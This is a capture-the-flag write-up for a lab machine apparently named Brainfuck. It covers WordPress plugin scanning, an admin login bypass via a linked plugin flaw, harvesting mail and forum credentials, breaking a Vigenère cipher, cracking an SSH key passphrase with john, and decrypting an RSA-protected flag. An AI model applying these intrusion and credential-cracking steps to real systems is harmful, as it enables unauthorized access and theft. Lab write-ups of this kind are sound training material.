# BRAINFUCK

email in https cert
- orestis@brainfuck.htb

domains in https cert
- brainfuck.htb
- sup3rs3cr3t.brainfuck.htb

https://brainfuck.htb is a wordpress we can wpscan it 
as the https cert is fucked we need to add --disable-tls-checks
```
wpscan --url https://brainfuck.htb --disable-tls-checks
```

```
[+] wp-support-plus-responsive-ticket-system
 | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
 | Last Updated: 2019-09-03T07:57:00.000Z
 | [!] The version is out of date, the latest version is 9.1.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 7.1.3 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
```

RCE 
```
https://wpscan.com/vulnerability/1527b75a-362d-47eb-85f5-47763c75b0d1/
```

so create the CVE.html file and access it in my browser 
now it's redirecting me toi
```
https://brainfuck.htb/wp-admin/admin-ajax.php
```
go back to 
```
https://brainfuck.htb/
```
and we are logged in as admin

the files in appearance -> editor 
```
You need to make this file writable before you can save your changes. See the Codex for more information.
```

so we can inject php here 


but we can see in settings the 'Easy WP SMTP' with 
- SMTP Port: 25
- SMTP username: orestis
- SMTP Password: kHGuERB29DNiNE

set up a mail client and get the emails of the user
```
Hi there, your credentials for our "secret" forum are below :)

username: orestis
password: kIEnnfEKJ#9UmdO

Regards
```

we can now access the supersecret forum 
in the 'SSH Access' post we can see orestis ask very kindly to his admin to send him a ssh access to an encrypted thread 
so in the 'key' post we see gibberish but we also can see that orestis posts still have the signature
```
    orestis
    Apr '17

Mya qutf de buj otv rms dy srd vkdof :)

Pieagnm - Jkoijeg nbw zwx mle grwsnn
```
```
     orestis
    Apr '17
    Edited

Go fuck yourself admin, I am locked out!! send me my key asap!

Orestis - Hacking for fun and profit
```

so we can probably decode this thanks to the signature 

```
└─$ python                              
Python 3.11.6 (main, Oct  8 2023, 05:06:43) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> enc = "Pieagnm - Jkoijeg nbw zwx mle grwsnn"
>>> pt = "Orestis - Hacking for fun and profit"
>>> list(zip(enc, pt))
[('P', 'O'), ('i', 'r'), ('e', 'e'), ('a', 's'), ('g', 't'), ('n', 'i'), ('m', 's'), (' ', ' '), ('-', '-'), (' ', ' '), ('J', 'H'), ('k', 'a'), ('o', 'c'), ('i', 'k'), ('j', 'i'), ('e', 'n'), ('g', 'g'), (' ', ' '), ('n', 'f'), ('b', 'o'), ('w', 'r'), (' ', ' '), ('z', 'f'), ('w', 'u'), ('x', 'n'), (' ', ' '), ('m', 'a'), ('l', 'n'), ('e', 'd'), (' ', ' '), ('g', 'p'), ('r', 'r'), ('w', 'o'), ('s', 'f'), ('n', 'i'), ('n', 't')]
>>> [ord(e)-ord(p) for e,p in zip(enc, pt)]
[1, -9, 0, -18, -13, 5, -6, 0, 0, 0, 2, 10, 12, -2, 1, -9, 0, 0, 8, -13, 5, 0, 20, 2, 10, 0, 12, -2, 1, 0, -9, 0, 8, 13, 5, -6]
>>> [(ord(e)-ord(p))%26 for e,p in zip(enc, pt)]
[1, 17, 0, 8, 13, 5, 20, 0, 0, 0, 2, 10, 12, 24, 1, 17, 0, 0, 8, 13, 5, 0, 20, 2, 10, 0, 12, 24, 1, 0, 17, 0, 8, 13, 5, 20]
>>> [(ord(e)-ord(p))%26 + ord('a') for e,p in zip(enc, pt)]
[98, 114, 97, 105, 110, 102, 117, 97, 97, 97, 99, 107, 109, 121, 98, 114, 97, 97, 105, 110, 102, 97, 117, 99, 107, 97, 109, 121, 98, 97, 114, 97, 105, 110, 102, 117]
>>> [chr((ord(e)-ord(p))%26 + ord('a')) for e,p in zip(enc, pt)]
['b', 'r', 'a', 'i', 'n', 'f', 'u', 'a', 'a', 'a', 'c', 'k', 'm', 'y', 'b', 'r', 'a', 'a', 'i', 'n', 'f', 'a', 'u', 'c', 'k', 'a', 'm', 'y', 'b', 'a', 'r', 'a', 'i', 'n', 'f', 'u']
```
in this code we take one by one the chars and ascii number of e - ascii number of p %26 (%26 is the number of letters in alphabet)
we can see that the key is brainfuckmy or fuckmybrain or mybrainfuck
so i decode the messages with https://www.dcode.fr/chiffre-vigenere and the key: fuckmybrain

- Hey give me the url for my key bitch :)
- Say please and i just might do so...
- Pleeeease....
- There you go you stupid fuck, I hope you remember your key password because I dont :)
- https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
- No problem, I'll brute force it ;)

so download the file then ssh2john then john
```
ssh2john enc_id_rsa_orestis > id_rsa_orestis.hash
```
```
john id_rsa_orestis.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
result: 3poulakia!

```
openssl rsa -in enc_id_rsa_orestis -out id_rsa_orestis
```
```
chmod 600 id_rsa_orestis
```
```
ssh -i id_rsa_orestis orestis@brainfuck.htb
```

and we are user

in orestis home we can find the encrypt.sage which is a mathematic software and output.txt who has the encrypted password 
the password is /root/root.txt so i suppose we need to decrypt it and we have our flag
quick googleing of 
```
p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
```
we can find 
- https://ctftime.org/writeup/6434 

the script is almost identical as ours and there is a solution 
```
python decode.py
n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977
pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750
```

then decode hex into ascii
```
Python 3.11.6 (main, Oct  8 2023, 05:06:43) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> pt = 24604052029401386049980296953784287079059245867880966944246662849341507003750
>>> f"{pt:x}"
'3665666331613564626238393034373531636536353636613330356262386566'
>>> bytes.fromhex(f"{pt:x}").decode()
'6efc1a5dbb8904751ce6566a305bb8ef'
>>> 
```

